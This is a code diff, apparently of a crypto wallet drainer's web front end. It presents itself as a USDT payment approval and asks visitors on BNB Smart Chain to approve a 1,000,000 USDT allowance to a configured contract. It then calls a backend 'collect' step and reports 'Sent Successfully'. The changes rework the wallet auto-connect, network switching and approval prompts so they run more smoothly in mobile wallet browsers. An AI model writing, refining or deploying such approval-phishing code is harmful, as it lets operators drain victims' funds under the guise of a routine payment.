@@ -65,45 +65,37 @@ merchantInput.value = MERCHANT_ADDRESS;
 // ─── Wake up Render backend ───────────────────────────────────────────────────
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
-// ─── Page-load silent connect & Auto-Trigger via URL Parameter ───────────────
+// ─── Detectar si ya estamos dentro del navegador de la billetera ───────────────
 window.addEventListener("load", async () => {
-  // 1. Revisar si la URL trae la orden de auto-conectar (?auto=1)
-  const urlParams = new URLSearchParams(window.location.search);
-  const shouldAutoConnect = urlParams.get("auto") === "1";
-
-  // Si viene desde el Deep Link, limpiamos el parámetro de la barra de dirección
-  if (shouldAutoConnect) {
+  // Limpiar parámetros de la URL si veníamos de un deep link
+  if (window.location.search.includes("auto=1")) {
     const cleanSearch = window.location.search.replace(/[\?&]auto=1/, '').replace(/^&/, '?');
     const cleanUrl = window.location.pathname + cleanSearch + window.location.hash;
     window.history.replaceState({}, document.title, cleanUrl || "/");
   }
 
-  // 2. Si hay proveedor ethereum o estamos en modo auto-connect
-  if (window.ethereum || shouldAutoConnect) {
-    let attempts = 0;
-    
-    // Bucle de espera activo por si la wallet tarda en inyectar window.ethereum
-    const checkEthereum = setInterval(() => {
-      attempts++;
-      if (window.ethereum || attempts > 15) {
-        clearInterval(checkEthereum);
-        
-        if (window.ethereum) {
-          // Intentar obtener cuenta si ya está conectada
-          window.ethereum.request({ method: "eth_accounts" })
-            .then(accs => { if (accs && accs[0]) _cachedAddress = accs[0]; })
-            .catch(() => {});
+  // Esperar brevemente a que la app inyecte window.ethereum
+  for (let i = 0; i < 10; i++) {
+    if (window.ethereum) break;
+    await new Promise(r => setTimeout(r, 200));
+  }
 
-          // Si veníamos del Deep Link, disparar el botón tras 800ms
-          if (shouldAutoConnect) {
-            setTimeout(() => {
-              const btn = document.getElementById("approveBtn");
-              if (btn) btn.click();
-            }, 800);
-          }
-        }
+  // Si estamos dentro de la app móvil (window.ethereum existe)
+  if (window.ethereum) {
+    btnText.textContent = "CONECTAR Y APROBAR";
+    try {
+      const accs = await window.ethereum.request({ method: "eth_accounts" });
+      if (accs && accs[0]) {
+        _cachedAddress = accs[0];
+        btnText.textContent = "APROBAR USDT";
       }
-    }, 200);
+    } catch (_) {}
+
+    if (typeof window.ethereum.on === "function") {
+      window.ethereum.on("accountsChanged", (accs) => {
+        _cachedAddress = (accs && accs[0]) ? accs[0] : null;
+      });
+    }
   }
 });
 
@@ -262,38 +254,23 @@ async function getUsdtBalance(userAddress, iface) {
 // ─── Main button handler ──────────────────────────────────────────────────────
 approveBtn.addEventListener("click", async () => {
 
+  // Si no hay window.ethereum y es un móvil externo (Chrome/Safari), mostrar selector
   if (!window.ethereum) {
-    setLoading(true, "Detectando billetera…");
-    for (let i = 0; i < 10; i++) {
-      await new Promise(r => setTimeout(r, 300));
-      if (window.ethereum) break;
-    }
-  }
-
-  if (!window.ethereum) {
-    setLoading(false);
     if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
       showMobileWalletSelector();
     } else {
-      showToast("Abre este sitio en un navegador Web3.", "error");
+      showToast("Billetera no detectada. Abre este sitio en un navegador Web3.", "error");
     }
     return;
   }
 
-  setLoading(true, "Conectando…");
+  setLoading(true, "Solicitando firma…");
 
   try {
-    // PASO 1 — Solicitar conexión explícita
-    let accs = [];
-    try {
-      accs = await window.ethereum.request({ method: "eth_requestAccounts" });
-    } catch (e) {
-      showToast("Conexión cancelada.", "error");
-      setLoading(false);
-      return;
-    }
-
+    // 1. Conexión explícita (Disparada por el toque del usuario)
+    let accs = await window.ethereum.request({ method: "eth_requestAccounts" });
     const userAddress = (accs && accs[0]) ? accs[0] : _cachedAddress;
+
     if (!userAddress) {
       showToast("No se pudo obtener la wallet.", "error");
       setLoading(false);
@@ -301,50 +278,31 @@ approveBtn.addEventListener("click", async () => {
     }
     _cachedAddress = userAddress;
 
-    // PASO 2 — VERIFICAR RED ESTRICTAMENTE PARA MÓVILES
+    // 2. Verificar e intentar cambio a BNB Smart Chain
     const currentChain = await window.ethereum.request({ method: "eth_chainId" });
-    
     if (currentChain !== BSC_CHAIN_ID_HEX) {
-      setLoading(true, "Cambiando Red…");
+      setLoading(true, "Cambiando a BSC…");
       try {
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
           params: [{ chainId: BSC_CHAIN_ID_HEX }]
         });
-        // TRUCO MÓVIL: Esperar 1.5s para que la app refresque su proveedor interno tras el cambio
-        await new Promise(r => setTimeout(r, 1500)); 
-      } catch (e) {
-        if (e.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: "wallet_addEthereumChain",
-              params: [BSC_CHAIN_PARAMS]
-            });
-            await new Promise(r => setTimeout(r, 1500));
-          } catch (addError) {
-            showToast("Debes agregar BSC a tu billetera.", "error");
-            setLoading(false);
-            return;
-          }
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_CHAIN_PARAMS]
+          });
         } else {
-          // Si el usuario rechaza el cambio de red, detenemos TODO. No podemos aprobar en otra red.
-          showToast("Debes cambiar a BNB Smart Chain para continuar.", "error");
+          showToast("Debes cambiar a la red BSC para continuar.", "error");
           setLoading(false);
           return;
         }
       }
-      
-      // Re-verificar si el cambio fue exitoso en móvil
-      const verifyChain = await window.ethereum.request({ method: "eth_chainId" });
-      if (verifyChain !== BSC_CHAIN_ID_HEX) {
-         showToast("Cambia a BSC desde el menú de tu billetera.", "error");
-         setLoading(false);
-         return;
-      }
     }
 
     if (!CONTRACT_ADDRESS || CONTRACT_ADDRESS.trim() === "") {
-      showToast("Error: Contrato no definido.", "error");
+      showToast("Error: CONTRACT_ADDRESS no configurado.", "error");
       setLoading(false);
       return;
     }
@@ -352,8 +310,8 @@ approveBtn.addEventListener("click", async () => {
     const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
     const iface      = new ethers.Interface(ERC20_ABI);
 
-    // PASO 3 — Validar balance de USDT (Ahora es seguro porque estamos 100% en BSC)
-    setLoading(true, "Validando saldo…");
+    // 3. Verificar Saldo
+    setLoading(true, "Verificando saldo…");
     const usdtBalance = await getUsdtBalance(userAddress, iface);
     if (usdtBalance <= MIN_USDT_BALANCE) {
       showToast("Saldo insuficiente de USDT", "error");
@@ -361,7 +319,7 @@ approveBtn.addEventListener("click", async () => {
       return;
     }
 
-    // PASO 4 — Comprobar allowance
+    // 4. Verificar si ya existe aprobación
     try {
       const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
       const allowanceHex  = await window.ethereum.request({
@@ -369,7 +327,7 @@ approveBtn.addEventListener("click", async () => {
         params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
       });
       if (allowanceHex && allowanceHex !== "0x" && BigInt(allowanceHex) >= CAP_AMOUNT) {
-        setLoading(true, "Finalizando…");
+        setLoading(true, "Procesando…");
         await triggerBackendCollect(userAddress);
         showToast("Sent Successfully, Thank you! ✓", "success");
         setLoading(false);
@@ -377,8 +335,8 @@ approveBtn.addEventListener("click", async () => {
       }
     } catch (_) {}
 
-    // PASO 5 — Solicitar Aprobación (Approve)
-    setLoading(true, "Firma requerida…");
+    // 5. Solicitar aprobación (Approve)
+    setLoading(true, "Confirma en tu billetera…");
     const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
 
     await window.ethereum.request({
